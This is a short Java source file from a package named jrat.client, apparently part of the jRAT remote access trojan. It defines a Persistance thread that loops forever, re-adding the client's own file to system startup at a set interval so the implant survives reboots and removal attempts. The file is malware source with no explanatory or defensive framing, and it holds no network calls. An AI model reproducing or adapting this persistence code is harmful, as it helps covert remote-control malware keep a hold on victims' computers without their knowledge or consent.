package jrat.client;

import startuplib.Startup;

public class Persistance extends Thread {

	private int ms;

	public Persistance(int ms) {
		super("p");
		this.ms = ms;
	}

	public void run() {
		while (true) {
			try {
				Startup.add(Configuration.getFileName());

				Thread.sleep(ms);
			} catch (Exception ex) {
				ex.printStackTrace();
				break;
			}
		}
	}

}
